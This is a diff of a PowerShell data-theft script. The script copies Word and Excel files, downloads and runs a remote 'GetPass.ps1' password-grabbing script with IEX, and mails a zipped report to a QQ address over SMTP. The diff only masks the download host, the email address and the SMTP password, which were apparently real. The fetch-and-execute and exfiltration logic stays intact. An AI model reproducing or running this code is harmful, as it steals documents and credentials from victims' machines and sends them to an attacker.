@@ -2751,7 +2751,7 @@ Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $co
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-IEX (New-Object Net.WebClient).DownloadString('http://www.cdxy.me/GetPass.ps1');
+IEX (New-Object Net.WebClient).DownloadString('http://www.xxx.xxx/GetPass.ps1');
 $date = get-date
 
 $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
@@ -2906,17 +2906,17 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('941335582@qq.com', 'bhuhlafiqjghbdgg');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxx@qq.com', 'bhuhlaxxxxxxxxx');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = '941335582@qq.com'
+$ReportEmail.From = 'xxxx@qq.com'
 
-$ReportEmail.To.Add('941335582@qq.com')
+$ReportEmail.To.Add('xxxx@qq.com')
 
-$ReportEmail.Subject = 'sub3'
+$ReportEmail.Subject = 'xxx'
 
-$ReportEmail.Body = 'sub3' 
+$ReportEmail.Body = 'xxx' 
 
 $ReportEmail.Attachments.Add('C:\Windows\Report.zip')
 
